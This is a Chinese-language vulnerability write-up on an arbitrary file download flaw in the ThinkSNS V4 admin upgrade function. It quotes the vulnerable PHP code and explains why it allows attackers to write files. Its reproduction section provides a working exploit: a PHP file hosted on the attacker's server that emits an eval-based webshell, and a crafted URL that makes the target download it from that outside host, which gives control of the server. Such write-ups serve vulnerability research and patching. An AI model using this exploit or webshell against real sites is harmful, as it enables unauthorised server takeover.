ThinkSNS V4 后台任意文件下载导致getshell
========================================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 漏洞分析

存在漏洞代码`\ts4\apps\admin\Lib\Action\UpgradeAction.class.php`中的一个函数中。

    public function step1()
    {
        $downUrl = $_GET['upurl'];
        $downUrl = urldecode($downUrl);
        $path = DATA_PATH.'/'.'upgrade/'.basename($downUrl);

        // # 备份老配置文件
        $oldConf = file_get_contents(CONF_PATH.'/thinksns.conf.php');
        file_put_contents(DATA_PATH.'/old.thinksns.conf.php', $oldConf);

        // # 下载增量包
        is_dir(dirname($path)) or mkdir(dirname($path), 0777, true);
        file_put_contents($path, file_get_contents($downUrl));
        file_exists($path) or $this->showError('下载升级包失败，请检查'.dirname($path).'目录是否可写，如果可写，请刷新重试！');

        // 验证hash判断包是否合法。
        $filename = dirname($path).'/upgrade.json';
        $data = file_get_contents($filename);
        $data = json_decode($data, false);
        if (md5_file($path) != $data->md5) {
            $this->showError('更新包校验失败，请重新执行升级.');
        }

函数

    file_put_contents — 将一个字符串写入文件
    file_get_contents — 将整个文件读入一个字符串

在这段函数中，先备份老配置文件，然后下载增量包，下载参数\$downUrl未经过任何处理，直接下载到网站目录下，接着验证hash判断包是否合法，但是并没有删除下载的增量包，导致程序在实现上存在任意文件下载漏洞，下载远程文件到网站目录下，攻击者可指定第三方url下载恶意脚本到网站目录，进一步触发恶意代码，控制网站服务器。

### 漏洞复线

在自己的服务器创建一个 `ian.php`

    <?php   
    echo "<?php";
    echo "eval(file_get_contents('php://input'));";  
    echo "?>";  
    ?>  

登录后台，通过访问构造的url，成功下载第三方源的恶意脚本文件

`http://www.0-sec.org:8000/ts4/index.php?app=admin&mod=Upgrade&act=step1&upurl=http://你的vps:8000/ian.php`

通过直接访问url，触发代码执行，成功获取网站服务器权限。
